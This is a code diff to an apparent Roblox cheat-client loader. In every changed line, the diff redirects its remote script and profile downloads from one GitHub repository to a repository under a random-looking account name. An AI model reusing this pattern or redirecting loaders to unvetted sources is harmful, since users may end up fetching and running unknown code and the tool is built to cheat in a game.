@@ -14,7 +14,7 @@ end
 local function downloadFile(path, func)
 	if not isfile(path) then
 		local suc, res = pcall(function()
-			return game:HttpGet('https://raw.githubusercontent.com/yanprime/vapeyan/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
+			return game:HttpGet('https://raw.githubusercontent.com/km7MyXPbLzXA0yWNoFRGcGg/Hehe/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
 		end)
 		if not suc or res == '404: Not Found' then
 			error(res)
@@ -50,7 +50,7 @@ local function downloadPremadeProfiles(commit)
     end
 
     local success, response = pcall(function()
-        return game:HttpGet('https://api.github.com/repos/yanprime/vapeyan/contents/profiles/premade?ref=' .. commit)
+        return game:HttpGet('https://api.github.com/repos/km7MyXPbLzXA0yWNoFRGcGg/Hehe/contents/profiles/premade?ref=' .. commit)
     end)
 
     if success and response then
@@ -63,7 +63,7 @@ local function downloadPremadeProfiles(commit)
                 if file.name and file.name:find('.txt') and file.name ~= 'commit.txt' then
                     local filePath = 'newvape/profiles/premade/' .. file.name
                     if not isfile(filePath) then
-                        local dl = file.download_url or ('https://raw.githubusercontent.com/yanprime/vapeyan/' .. commit .. '/profiles/premade/' .. file.name)
+                        local dl = file.download_url or ('https://raw.githubusercontent.com/km7MyXPbLzXA0yWNoFRGcGg/Hehe/' .. commit .. '/profiles/premade/' .. file.name)
                         local ds, dc = pcall(function()
                             return game:HttpGet(dl, true)
                         end)
@@ -79,12 +79,12 @@ end
 
 if not shared.VapeDeveloper then
 	local _, subbed = pcall(function()
-		return game:HttpGet('https://github.com/yanprime/vapeyan')
+		return game:HttpGet('https://github.com/km7MyXPbLzXA0yWNoFRGcGg/Hehe')
 	end)
 
 	local commit = 'main'
 	local ok, res = pcall(function()
-		return game:HttpGet('https://api.github.com/repos/yanprime/vapeyan/commits/main', true)
+		return game:HttpGet('https://api.github.com/repos/km7MyXPbLzXA0yWNoFRGcGg/Hehe/commits/main', true)
 	end)
 
 	if ok and res then
